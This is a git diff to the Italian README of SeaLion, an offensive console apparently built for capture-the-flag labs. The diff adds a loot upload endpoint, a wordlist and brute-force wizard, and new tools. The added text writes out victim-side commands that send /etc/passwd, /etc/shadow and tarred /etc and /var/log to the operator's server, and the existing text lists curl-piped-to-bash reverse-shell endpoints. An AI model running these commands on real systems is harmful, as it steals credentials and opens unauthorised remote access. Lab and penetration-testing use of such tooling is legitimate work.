@@ -84,6 +84,9 @@ slconsole> notes <argomento>      # Guide e appunti
 slconsole> find <parola>          # Cerca in vuln, tool e notes
 slconsole> serve on               # Avvia il server HTTP di delivery
 slconsole> serve list             # Mostra file serviti con curl
+slconsole> loot                   # Elenca file ricevuti dalla vulnbox
+slconsole> loot read <nome|num>   # Mostra contenuto di un file loot
+slconsole> wordfind http://target # Wizard wordlist per fuzzing/bruteforce
 slconsole> back                   # Torna alla console principale
 ```
 
@@ -115,8 +118,10 @@ slconsole> serve help                        # Documentazione completa
 | Endpoint | Curl |
 |----------|------|
 | `/upgrade` | `curl http://<IP>:2727/upgrade \| bash` — upgrade shell (socat/python pty) |
+| `/upgrade2` | `curl http://<IP>:2727/upgrade2 \| bash` — upgrade in-place (no nuova connessione) |
 | `/rev` | `curl http://<IP>:2727/rev \| bash` — reverse shell Bash |
 | `/sh` | `curl http://<IP>:2727/sh \| bash` — reverse shell Python |
+| `/upload` | `curl -F "file=@/path/file" http://<IP>:2727/upload` — upload file dalla vulnbox |
 
 ### File statici
 
@@ -126,6 +131,113 @@ Qualsiasi file messo nella cartella `static/` viene automaticamente servito e mo
 - binari → `curl http://<IP>:2727/file -o file && chmod +x file`
 
 Usa `serve fetch` per scaricare automaticamente linpeas, winpeas, pspy, linenum e altri.
+
+---
+
+## Loot — Upload dalla Vulnbox (`loot`)
+
+Endpoint `/upload` per ricevere file dalla macchina vittima. I file vengono salvati nella cartella `loot/` con timestamp e IP sorgente, consultabili da console, web e filesystem.
+
+### Upload dalla vulnbox
+
+```bash
+# Upload file singolo (multipart form — il più comune)
+curl -F "file=@/etc/passwd" http://<IP>:2727/upload
+
+# Upload via pipe (utile per output di comandi)
+cat /etc/shadow | curl -X POST -d @- http://<IP>:2727/upload/shadow.txt
+
+# Upload con PUT (nome file nell'URL)
+curl -T /tmp/database.db http://<IP>:2727/upload/database.db
+
+# Esfiltra cartelle intere via tar
+tar czf - /etc /var/log | curl -X POST -d @- http://<IP>:2727/upload/exfil.tar.gz
+
+# Upload multipli in un colpo solo
+for f in /etc/passwd /etc/shadow /etc/hosts; do
+    curl -F "file=@$f" http://<IP>:2727/upload
+done
+```
+
+I file vengono salvati con il formato `<IP>_<DATA>_<ORA>_<NOME>`, ad esempio `10.10.14.5_2024-01-15_14-30-22_passwd`.
+
+### Gestione loot dalla console
+
+```
+slconsole> loot                   # Elenca i file ricevuti
+slconsole> loot read <nome|num>   # Mostra il contenuto di un file
+slconsole> loot clear             # Elimina tutti i file loot
+slconsole> loot help              # Documentazione completa
+```
+
+---
+
+## Wordfind — Wizard Wordlist (`wordfind`)
+
+Wizard interattivo che in base al target, scopo, tecnologia e intensità suggerisce le wordlist giuste da SecLists e genera comandi pronti per fuzzing e bruteforce.
+
+```
+slconsole> wordfind http://10.10.11.42
+slconsole> wordfind https://target.htb
+slconsole> wordfind http://10.10.11.42/login
+slconsole> wordfind http://10.10.11.42/api/v1
+```
+
+### Flusso del wizard
+
+Il wizard fa domande diverse in base allo scopo selezionato:
+
+| Step | Domanda | Quando |
+|------|---------|--------|
+| Scopo | Directory/subdomain/vhost/parametri/username/password/API | Sempre |
+| Tecnologia | PHP/ASP/Java/Python/Node/WordPress/Joomla/generico | Solo per directory |
+| Tipo API | REST/GraphQL/Swagger | Solo per API |
+| Contesto password | Login web/servizio di rete/hash offline | Solo per password |
+| Lingua | Inglese/Italiano/Spagnolo/Tedesco/Francese/misto | Solo per password |
+| Username | Testo libero | Solo per password |
+| Intensità | Veloce/media/completa | Sempre |
+
+### Tool supportati nei comandi generati
+
+| Scopo | Tool |
+|-------|------|
+| **Directory/file** | gobuster, ffuf, dirb, feroxbuster, wfuzz, dirsearch |
+| **Sottodomini** | gobuster, ffuf, wfuzz, amass, dnsenum |
+| **Virtual Host** | gobuster, ffuf, wfuzz |
+| **Parametri** | ffuf, wfuzz, arjun |
+| **Password web** | hydra, ffuf, wfuzz, medusa |
+| **Password servizi** | hydra, medusa, ncrack, crackmapexec |
+| **Hash offline** | john, hashcat |
+| **API** | ffuf, gobuster, wfuzz, feroxbuster |
+
+### Esempio
+
+```
+slconsole> wordfind http://10.10.11.42
+
+  [1] Cosa stai cercando?    → Directory / file
+  [2] Tecnologia?            → PHP
+  [3] Intensità?             → Media
+
+  ┌─ Risultato ────────────────────────────────┐
+
+  Wordlist consigliate:
+    [1] directory-list-2.3-medium.txt  (220k)
+    [2] common.txt                      (4.7k)
+    [3] PHP.fuzz.txt                    (274)
+
+  Estensioni: .php,.phtml,.txt,.bak,.php.bak
+
+  Comandi pronti:
+
+    gobuster dir -u http://10.10.11.42 \
+      -w .../directory-list-2.3-medium.txt -x php,txt,bak -t 50
+
+    ffuf -u http://10.10.11.42/FUZZ \
+      -w .../directory-list-2.3-medium.txt -e .php,.txt,.bak -t 50 -c
+
+  └────────────────────────────────────────────┘
+```
 
 ---
 
@@ -143,6 +255,7 @@ Usa `serve fetch` per scaricare automaticamente linpeas, winpeas, pspy, linenum 
 | **Tools** | `/tools/` | Documentazione di tutti i tool installabili |
 | **Static** | `/static/` | Gestione file statici (crea, importa, modifica, elimina) |
 | **Delivery** | `/delivery` | Pannello curl per post-exploitation |
+| **Loot** | `/loot/` | File ricevuti dalla vulnbox (visualizza, scarica, elimina) |
 
 ### Come accedere
 
@@ -160,16 +273,16 @@ I contenuti `.md` vengono renderizzati in stile Notion con syntax highlighting p
 
 ---
 
-## Tool inclusi (33)
+## Tool inclusi (41)
 
 | Categoria | Tool |
 |-----------|------|
-| **Ricognizione & OSINT** | nmap, shodan, theHarvester, recon-ng, finalrecon, whois |
-| **DNS & Web Fuzzing** | dnsenum, gobuster, nikto, scrapy, nuclei |
+| **Ricognizione & OSINT** | nmap, shodan, theHarvester, recon-ng, finalrecon, whois, amass |
+| **DNS & Web Fuzzing** | dnsenum, gobuster, ffuf, feroxbuster, dirsearch, wfuzz, nikto, scrapy, nuclei |
 | **Enumerazione Servizi** | enum4linux-ng, smbmap, crackmapexec/netexec, onesixtyone, braa, ssh-audit, rdp-sec-check |
 | **Accesso Remoto & Post-Exploitation** | evil-winrm, impacket, odat, xfreerdp |
-| **Password Cracking & Wordlist** | john, hashcat, hashid, hydra, cewl, seclists, htb-wordlists |
-| **Web Application** | wafw00f |
+| **Password Cracking & Wordlist** | john, hashcat, hashid, hydra, ncrack, medusa, cewl, seclists, htb-wordlists |
+| **Web Application** | wafw00f, arjun |
 | **Framework** | msfconsole |
 | **Altro** | basics |
 
@@ -230,7 +343,7 @@ SeaLion/
 ├── ascii-art.txt       # Logo ASCII
 ├── README.md
 │
-├── tool/               # 33 tool — ogni sottocartella contiene:
+├── tool/               # 41 tool — ogni sottocartella contiene:
 │   ├── nmap/
 │   │   ├── help.md     #   documentazione
 │   │   └── install.py  #   script di installazione
@@ -244,6 +357,9 @@ SeaLion/
 ├── static/             # File serviti dal Quick-Delivery Server
 │   ├── linpeas.sh
 │   ├── pspy64
+│   └── ...
+│
+├── loot/               # File ricevuti dalla vulnbox via /upload
 │   └── ...
 │
 └── assets/             # Risorse (GIF, immagini)
